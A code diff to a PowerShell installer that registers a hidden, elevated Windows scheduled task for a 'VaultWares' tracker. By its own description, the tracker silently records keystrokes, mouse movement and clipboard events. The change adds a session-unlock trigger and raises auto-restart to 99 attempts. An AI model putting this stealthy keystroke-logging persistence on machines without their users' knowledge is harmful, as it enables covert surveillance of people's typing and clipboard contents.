@@ -92,21 +92,25 @@ $trackerAction = New-ScheduledTaskAction `
     -Argument   "--headless powershell.exe -NoProfile -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command `"& '$pythonResolved' '$TrackerScript'`"" `
     -WorkingDirectory $ScriptDir
 
-$trackerTrigger  = New-ScheduledTaskTrigger -AtLogOn
+$trackerTriggerLogon  = New-ScheduledTaskTrigger -AtLogOn
+# Also trigger on workstation unlock so the tracker resumes after a locked screen
+$trackerTriggerUnlock = New-CimInstance -Namespace ROOT\Microsoft\Windows\TaskScheduler `
+    -ClassName MSFT_TaskSessionStateChangeTrigger `
+    -Property @{ StateChange = 8; Enabled = $true } -ClientOnly   # 8 = SESSION_UNLOCK
 $trackerSettings = New-ScheduledTaskSettingsSet `
     -ExecutionTimeLimit (New-TimeSpan -Hours 0)  `
     -MultipleInstances  IgnoreNew                `
-    -RestartCount       3                        `
+    -RestartCount       99                       `
     -RestartInterval    (New-TimeSpan -Minutes 1)`
     -StartWhenAvailable
 
 Register-ScheduledTask `
     -TaskName   $TrackerTask `
     -Action     $trackerAction `
-    -Trigger    $trackerTrigger `
+    -Trigger    @($trackerTriggerLogon, $trackerTriggerUnlock) `
     -Settings   $trackerSettings `
     -RunLevel   Highest `
-    -Description "VaultWares: silently tracks keystrokes, mouse movement, saves, and copy/paste events." `
+    -Description "VaultWares: silently tracks keystrokes, mouse movement, saves, and copy/paste events. Starts at logon + unlock, restarts automatically on crash." `
     | Out-Null
 
 Write-Host "  Task '$TrackerTask' registered — starts at every logon." -ForegroundColor Green
